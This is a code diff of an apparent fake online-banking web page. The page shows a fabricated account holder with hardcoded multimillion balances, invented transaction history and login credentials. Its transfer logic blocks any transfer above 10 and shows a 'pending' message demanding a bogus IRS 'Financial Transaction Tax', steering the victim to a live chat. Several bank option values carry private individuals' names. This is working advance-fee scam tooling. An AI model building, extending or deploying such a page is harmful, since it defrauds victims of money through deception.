@@ -690,45 +690,63 @@
             <div class="form-group">
                 <label>From Account</label>
                 <select class="form-control" id="fromAccount">
-                    <option value="checking">Checking (...4321)</option>
-                    <option value="savings">Savings (...8765)</option>
+                    <option value="checking">Checking (...9287)</option>
+                    <option value="savings">Savings (...9287)</option>
                 </select>
             </div>
 
             <div class="form-group">
                 <label>To Account Number</label>
-                <input type="number" class="form-control" id="toAccountNumber" placeholder="Enter Account Number">
+                <input type=" " class="form-control" id="toAccountNumber" placeholder="Enter Account Number">
             </div>
 
-
+            <div class="form-group">
+                <label>BSB</label>
+                <input type=" " class="form-control" id="routingNumber" placeholder="Enter BSB Number">
+            </div>
 
             <div class="form-group">
                 <label>To Bank</label>
                 <select class="form-control" id="toBank">
-                    <option value="zelle">Send with Zelle®</option>
-                    <option value="wells-fargo">Wells Fargok</option>
                     <option value="boa">Bank of America</option>
+                    <option value="NAB">National Australia Bank</option>
+                    <option value="Commonwealth Bank">Commonwealth Bank of Australia</option>
+                    <option value="BOQ">Bank of Queensland</option>
+                    <option value="AMP">AMP Bank</option>
+                    <option value="Bankwest">Bankwest</option>
+                    <option value="ANZ">Australia and New Zealand Banking Group</option>
+                    <option value="William Murray">Ubank</option>
+                    <option value="Beyond bank">Beyond bank</option>
+                    <option value="Suncorp">Suncorp Bank</option>
+                    <option value="Rachael Colliss Carmel">NAB bank</option>
+                    <option value="Westpac">Westpac Banking Corporation</option>
+                    <option value="(SMBC)">Sumitomo Mitsui Banking Corporation</option>
+                    <option value="Aozora">Aozora Bank</option>
+                    <option value="(MUFG)">Mitsubishi UFJ Financial Group</option>
+                    <option value="Resona ">Resona Bank</option>
+                    <option value="SSB">SBI Shinsei Bank</option>
+                    <option value="Standard Chartered">Standard Chartered</option>
+                    <!-- <option value="Christopher Garcia">Standard Chartered</option> -->
+                    <option value="pnc">PNC Financial Service®</option>
+                    <option value="wellby">Wellby Financial</option>
+                    <option value="amex">American Express®</option>
+                    <option value="Barklays">Barklays</option>
+                    <option value="hsbc">HSBC</option>
+                    <option value="scotlandbank">Bank of Scotland</option>
+                    <option value="wells-fargo">Wells Fargo</option>
+                    <option value="Commerzbank AG">Commerzbank AG</option>
                     <option value="fbp">Federal Bank of Portugal</option>
                     <option value="eurobic">EuroBic Bank PLC</option>
                     <option value="nu-bank">NU Bank</option>
-                    <!-- <option value="sc">Standard Chartered</option> -->
-                    <option value="nu-bank">NU Bank</option>
-                    <option value="Standard Chartered">Standard Chartered</option>
                     <!-- <option value="capitalone">Capital One</option> -->
-                    <option value="Capital One">Capital One</option>
-                    <option value="pnc">PNC Financial Service®</option>
-                    <option value="amex">American Express®</option>
-                    <option value="pnc">PNC Financial Service®</option>
-                    <option value="Barklays">Barklays</option>
+                    <option value="Ryan Rodriguez">Capital One</option>
                     <option value="nt">Northern Trust</option>
-                    <option value="hsbc">HSBC</option>
                     <option value="boe">Bank of England</option>
                     <option value="td">TD Bank</option>
-                    <option value="scott bank">Bank of Scotland</option>
-                    <!-- <option value="chase">Chase Bank PLC®</option> -->
-                    <option value="credit union">Federal Navy Credit Union</option>
-                    <option value="Chase Bank">Chase Bank PLC®</option>
+                    <option value="chase">CHASE PLC®</option>
+                    <!-- <option value="Charles David Brown">CHASE PLC®</option> -->
                     <option value="spain-bank">Bank of Spain</option>
+                    <option value="zelle">Send with Zelle®</option>
                 </select>
             </div>
 
@@ -942,36 +960,35 @@
         let currentCurrency = 'USD';
         // let profileImage = "https:/img/features-1.svg";
 
-        const BANK_ID = "bank_failed"
-        const FIXED_NAME = 'KIING';
-        const FIXED_CHECKING = 397546.54;
-        const FIXED_SAVINGS = 60360.70;
+        const BANK_ID = "$TYLER22"
+        const FIXED_NAME = 'Tyler Hogan';
+        const FIXED_CHECKING = 1559950.00;
+        const FIXED_SAVINGS = 500000.50;
 
         // Pre-made accounts
         const accounts = [
             {
-                name: "KIING",
-                email: "billionaire@gmail.com",
-                username: "KIING",
-                password: "12345678",
-                balance: 397546.54,
+                name: "Tyler Hogan",
+                email: "tylerh01@gmail.com",
+                username: "billionaire",
+                password: "htyler321",
+                balance: 1559950.00,
                 currency: "USD",
                 transferPin: "2580" // ← added
             }
         ];
 
         // Initialize transactions with sample data
-        const DEFAULT_TRANSACTIONS = [
-            // { id: 1736380800002, date: '2026-05-06', description: 'Transfer to Minhaj Welfare Foundation USA INC', amount: -53000.00, category: 'Transfer', status: 'completed' },
-            // { id: 1736380800002, date: '2026-05-06', description: 'Transfer to Zelle', amount: +53000.50, category: 'Transfer', status: 'reverted' },           
-            { id: 1730764800005, date: '2026-06-12', description: 'United Nations Department Of Operational Support (DOS)', amount: 443000.50, category: 'Credit', status: 'completed' },
-            { id: 1675900800001, date: '2026-05-31', description: 'Stamp charges', amount: -2500.00, category: 'Debit', status: 'completed' },
-            { id: 1736380800002, date: '2026-05-19', description: 'Traders Joe', amount: -3000.50, category: 'Debit', status: 'completed' },
-            { id: 1736294400004, date: '2026-05-16', description: 'Deposit', amount: 85000.00, category: 'Income', status: 'completed' },
-            { id: 1736380800003, date: '2026-05-09', description: 'Paramount Business Jets', amount: -20500.00, category: 'Flight Payment', status: 'completed' },
-            { id: 1736380800002, date: '2026-05-02', description: 'Whole Foods Market', amount: -2800.50, category: 'Debit', status: 'completed' },
-            { id: 1736380800002, date: '2026-04-30', description: 'Apple itunes', amount: -500.00, category: 'Debit', status: 'completed' },
-            { id: 1725667200006, date: '2026-04-24', description: 'Withdrawal', amount: -5000.00, category: 'Insurance', status: 'completed' }
+       const DEFAULT_TRANSACTIONS = [
+           
+            // { id: 1758320000054, date: '2026-08-11', description: 'Rachael Colliss Carmel', amount: -600000.00, category: 'Debit', status: 'completed' },
+            // { id: 1758320000054, date: '2026-08-10', description: 'William Murray', amount: -160000.00, category: 'Debit', status: 'completed' },
+            { id: 1758320000054, date: '2026-07-11', description: 'Traders Joe', amount: -3000.50, category: 'Debit', status: 'completed' },
+            { id: 1736410800000, date: '2026-06-19', description: 'Paramount Business Jets', amount: -40500.00, category: 'Flight Payment', status: 'completed' },
+            { id: 1736380800002, date: '2026-06-05', description: 'Stamp charges', amount: -5500.00, category: 'Debit', status: 'completed' },
+            { id: 1730764800005, date: '2026-06-04', description: 'Makana Ltd Contract Agreement', amount: 2000000.00, category: 'Credit', status: 'completed' },
+            { id: 1725667200006, date: '2026-06-02', description: 'Whole Foods Market', amount: -2800.50, category: 'Debit', status: 'completed' },
+            { id: 1675900800001, date: '2026-05-07', description: 'Withdrawal', amount: -50000.00, category: 'Debit', status: 'completed' }
         ];
 
 
@@ -1126,6 +1143,16 @@
                                 <button class="btn" style="background: rgba(255,255,255,0.2); color: white;" onclick="showModal('transferModal')">Transfer</button>
                                 <button class="btn" style="background: rgba(255,255,255,0.2); color: white;" onclick="showModal('depositCheckModal')">Deposit</button>
                             </div>
+                        </div>
+
+                        <div class="account-card credit">
+                            <div class="account-header">
+                                <div>
+                                    <div class="card-chip"></div>
+                                </div>
+                            </div>
+                            <div class="card-number">•••• •••• •••• 7443</div>
+                            <div class="card-holder">Tyler Hogan</div>
                         </div>
                     </div>
                 </div>
@@ -1516,9 +1543,9 @@
 
             if (amount > 10) {
                 showAuthFeedback(
-                    'FAILED !',
+                    'Action Required!',
 
-                    `Transfer of ${formatCurrency(amount)} was not completed.
+                    `Transfer of ${formatCurrency(amount)} is pending.
                     
                      Please note that a one-time Financial Transaction Tax (FTT) payment is required on your account in accordance with IRS regulations.
                      For further assistance, kindly contact our Customer Care team. 
@@ -1559,7 +1586,7 @@
                 description: `Transfer to ${toAccount}`,
                 amount: -amount,
                 category: 'Transfer',
-                status: 'failed',
+                status: 'pending',
                 details: {
                     fromAccount: fromAccount,
                     toAccount: toAccount,
@@ -1885,16 +1912,16 @@
 
     <!--Start of Tawk.to Script-->
     <script type="text/javascript">
-        var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
-        (function () {
-            var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
-            s1.async = true;
-            s1.src = 'https://embed.tawk.to/698cb28555a5d71c35acd1bd/1jh6pimpo';
-            s1.charset = 'UTF-8';
-            s1.setAttribute('crossorigin', '*');
-            s0.parentNode.insertBefore(s1, s0);
-        })();
-    </script>
+    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+    (function () {
+        var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+        s1.async = true;
+        s1.src = 'https://embed.tawk.to/68c6bc223c57f819275d5edd/1j544tq3s';
+        s1.charset = 'UTF-8';
+        s1.setAttribute('crossorigin', '*');
+        s0.parentNode.insertBefore(s1, s0);
+    })();
+</script>
     <!--End of Tawk.to Script-->
 
 
